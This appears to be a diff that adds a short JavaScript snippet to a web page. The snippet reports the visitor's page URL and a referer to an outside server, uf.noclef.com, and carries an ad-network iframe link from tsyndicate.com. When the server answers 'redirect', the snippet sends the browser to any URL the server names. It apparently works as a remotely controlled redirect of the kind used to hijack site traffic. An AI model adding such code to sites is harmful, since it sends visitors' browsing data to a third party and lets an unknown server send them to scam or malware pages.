@@ -1,0 +1,13 @@
+(function (w, domainPath, referer) {
+  var doc_location = encodeURIComponent(w.location.toString());
+  referer = referer ? encodeURIComponent(referer) : '';
+  var urlToXML = domainPath + "/v1/puma/check/" + w.location.hostname + "?referer=" + referer + "&doc_location=" + doc_location;
+  w.ufApp.sendXMLGetRequest(urlToXML, function (err, response) {
+    if (err) {
+      return;
+    }
+    if (response && response.data && response.data.solution && response.data.solution === 'redirect' && response.data.url) {
+      w.location.replace(response.data.url);
+    }
+  });
+})(window, "https://uf.noclef.com", "https://tsyndicate.com/iframes2/6b1b3e6c6ca147ffa439c8ea4da711a7.html?categories=%7Bcategories%7D&amp;subid=4000&amp;adb=0&amp;w=750&amp;h=1334");
